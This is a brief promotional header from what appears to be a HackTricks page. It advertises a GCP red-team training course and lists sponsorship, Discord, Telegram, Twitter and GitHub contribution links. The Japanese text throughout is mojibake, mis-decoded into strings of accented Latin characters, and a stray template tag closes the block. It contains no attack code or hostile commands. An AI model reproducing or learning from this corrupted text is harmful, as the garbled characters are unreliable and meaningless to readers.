GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
